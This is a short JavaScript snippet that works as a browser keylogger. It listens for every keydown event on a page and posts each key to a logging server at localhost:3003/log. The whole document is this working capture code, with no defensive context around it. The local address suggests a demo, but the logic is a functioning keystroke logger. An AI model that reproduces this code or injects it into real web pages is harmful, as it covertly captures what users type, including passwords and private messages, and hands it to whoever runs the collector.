document.addEventListener('keydown', function (event) {
    // This sends the key to localhost:3003.
    fetch('http://localhost:3003/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                key: event.key
            })
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch((error) => {
            console.error('Error:', error);
        });
});